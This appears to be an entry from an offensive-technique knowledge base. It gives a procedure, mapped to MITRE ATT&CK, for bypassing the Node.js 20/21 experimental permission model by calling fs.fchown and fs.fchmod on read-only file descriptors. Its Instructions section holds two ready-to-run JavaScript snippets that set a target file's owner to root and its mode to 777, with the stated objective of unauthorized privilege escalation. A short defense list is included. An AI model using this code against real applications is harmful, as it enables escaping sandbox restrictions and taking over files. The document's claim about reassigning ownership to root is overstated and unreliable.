---
id: proc-nodejs-modify-fd-ownership-001
tags:
  - node.js
  - fchown
  - fchmod
  - privilege-escalation
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/node-fs-fchown-modify]]'
  - '[[commands/node-fs-fchmod-modify]]'
verified: false
platforms:
  - Node.js
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Privilege Escalation]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:29:57.071Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploitation for Privilege Escalation]]'
  - '[[JavaScript]]'
---
# Modify-File-Ownership-Permissions-via-File-Descriptor

## Summary

This procedure uses a read-only file descriptor obtained from fs.open to call fs.fchown or fs.fchmod, modifying file ownership or permissions without the --allow-fs-write flag, bypassing Node.js experimental permission model restrictions.

## Description

The Node.js permission model enforces checks on file paths for write operations but overlooks file descriptors. By passing a read-only descriptor to fs.fchown(fd, uid, gid) or fs.fchmod(fd, mode), attackers can alter ownership (e.g., to root) or permissions (e.g., to 777) on sensitive files, leading to privilege escalation in applications using the model for isolation. This affects Node.js 20 and 21 when --allow-fs-write is absent.

## Requirements

1. Valid read-only file descriptor from prior step
2. Node.js 20 or 21 with experimental permission model and --allow-fs-read
3. Target file accessible for reading
4. Knowledge of desired uid/gid or mode values

## Defense

Defensive measures and detection strategies:

- Enable full permission model audits or disable experimental features
- Restrict fs module usage to whitelisted paths and operations
- Log and alert on fchown/fchmod calls, especially with read-only descriptors
- Use containerization or seccomp to limit file system modifications

## Objectives

1. Change file ownership or permissions unauthorized
2. Achieve privilege escalation via modified access controls
3. Demonstrate bypass of permission model write restrictions

## Instructions

### Step 1: Modify File Ownership with fchown

**Context**: Use the descriptor to set new uid and gid, e.g., to root (0,0), bypassing path-based checks.

**Command** ([[commands/node-fs-fchown-modify]]):
```javascript
const fs = require('fs');
const fd = fs.openSync('target-file.txt', 'r');
fs.fchownSync(fd, 0, 0);
console.log('Ownership modified to root');
fs.closeSync(fd);
```

> This changes ownership without write permissions. Verify with OS tools like ls -l showing new owner. Errors indicate failure.

### Step 2: Modify File Permissions with fchmod

**Context**: Alter mode to grant excessive permissions, e.g., full read/write/execute.

**Command** ([[commands/node-fs-fchmod-modify]]):
```javascript
const fs = require('fs');
const fd = fs.openSync('target-file.txt', 'r');
fs.fchmodSync(fd, 0o777);
console.log('Permissions set to 777');
fs.closeSync(fd);
```

> Sets permissions to rwxrwxrwx. Success shown by updated file modes in ls -l; potential for further exploitation.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Exploitation for Privilege Escalation]] Exploitation for Privilege Escalation
- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/node-fs-fchown-modify]]
- [[commands/node-fs-fchmod-modify]]

## Tools Used


## Tags

- [[node.js]]
- [[fchown]]
- [[fchmod]]
- [[privilege-escalation]]
